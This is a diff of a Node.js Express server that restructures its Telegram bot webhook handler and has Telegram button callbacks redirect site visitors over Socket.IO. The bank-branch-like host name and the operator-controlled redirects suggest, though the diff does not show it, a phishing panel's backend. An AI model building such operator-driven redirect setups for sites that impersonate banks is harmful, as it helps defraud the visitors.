@@ -34,18 +34,10 @@ const webhookUrl = `https://sucusalbogotapersona.onrender.com/api/webhook`;
 bot.setWebHook(webhookUrl)
     .then(() => {
         console.log('✅ Webhook configurado exitosamente para:', webhookUrl);
-        console.log('🚫 Polling desactivado - Sin conflictos 409');
     })
     .catch(err => {
         console.error('❌ Error configurando webhook:', err);
     });
-
-// Ruta para recibir updates de Telegram via Webhook
-app.post('/api/webhook', (req, res) => {
-    console.log('📨 Webhook recibido de Telegram');
-    bot.processUpdate(req.body);
-    res.sendStatus(200);
-});
 
 // Middlewares
 app.use(express.json());
@@ -91,6 +83,26 @@ app.use('/Imagenes', express.static(path.join(__dirname, 'Imagenes')));
 // Ruta para favicon
 app.get('/favicon.ico', (req, res) => {
     res.sendFile(path.join(__dirname, 'Imagenes', 'channels4_profile-removebg-preview.png'));
+});
+
+// **CORRECCIÓN CRÍTICA: Webhook mejorado**
+app.post('/api/webhook', (req, res) => {
+    try {
+        console.log('📨 Webhook recibido de Telegram');
+        
+        // Verificar que el body no esté vacío
+        if (!req.body || Object.keys(req.body).length === 0) {
+            console.log('⚠️ Webhook vacío recibido');
+            return res.sendStatus(200); // Siempre responder 200 a Telegram
+        }
+        
+        console.log('📦 Contenido del webhook:', JSON.stringify(req.body));
+        bot.processUpdate(req.body);
+        res.sendStatus(200);
+    } catch (error) {
+        console.error('❌ Error procesando webhook:', error);
+        res.sendStatus(200); // Siempre responder 200 a Telegram incluso con error
+    }
 });
 
 // Función para enviar mensajes a Telegram
@@ -216,7 +228,6 @@ bot.on('callback_query', async (callbackQuery) => {
 
         console.log(`📍 Redirigiendo a: ${redirectUrl}`);
         
-        // EMITIR ACCIÓN VIA SOCKET.IO PARA QUE EL CLIENTE REDIRIJA
         io.emit('telegram_action', {
             action: action,
             messageId: messageId,
@@ -243,5 +254,4 @@ httpServer.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Servidor ejecutándose en puerto: ${PORT}`);
     console.log(`🌍 Entorno: ${process.env.NODE_ENV || 'production'}`);
     console.log(`🔗 URL: https://sucusalbogotapersona.onrender.com`);
-    console.log(`🤖 Bot configurado: SOLO WEBHOOK`);
 });
